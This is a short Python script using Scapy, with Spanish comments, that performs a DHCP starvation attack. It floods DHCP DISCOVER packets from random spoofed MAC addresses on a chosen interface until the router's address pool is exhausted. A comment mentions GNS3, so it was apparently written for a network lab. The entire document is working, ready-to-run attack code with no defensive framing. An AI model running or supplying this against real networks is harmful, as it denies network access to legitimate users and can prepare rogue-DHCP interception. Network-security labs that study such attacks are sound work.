#!/usr/bin/env python3
from scapy.all import *
import time

# --- CONFIGURACIÓN ---
interface = "eth0"
# ---------------------

print(f"[*] Iniciando DHCP Starvation en {interface}...")
print("[*] Objetivo: Agotar el Pool DHCP del Router.")

try:
    while True:
        # 1. Generar MAC aleatoria
        fake_mac = RandMAC()
        
        # 2. Convertir MAC a formato binario para el campo 'chaddr' de BOOTP
        # Scapy a veces necesita ayuda con esto en el campo chaddr
        mac_bytes = mac2str(fake_mac)

        # 3. Construir Paquete DHCP DISCOVER
        # Estructura: Ether -> IP -> UDP -> BOOTP -> DHCP
        pkt = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=mac_bytes, xid=RandInt()) / \
              DHCP(options=[("message-type", "discover"), "end"])

        # 4. Enviar (verbose=0 para que no llene la pantalla)
        sendp(pkt, iface=interface, verbose=0)
        
        print(f"\r[+] IPs solicitadas con MACs falsas... (Ctrl+C para parar)", end="")
        # Pequeña pausa para no colgar tu GNS3
        time.sleep(0.05)

except KeyboardInterrupt:
    print("\n[!] Ataque detenido.")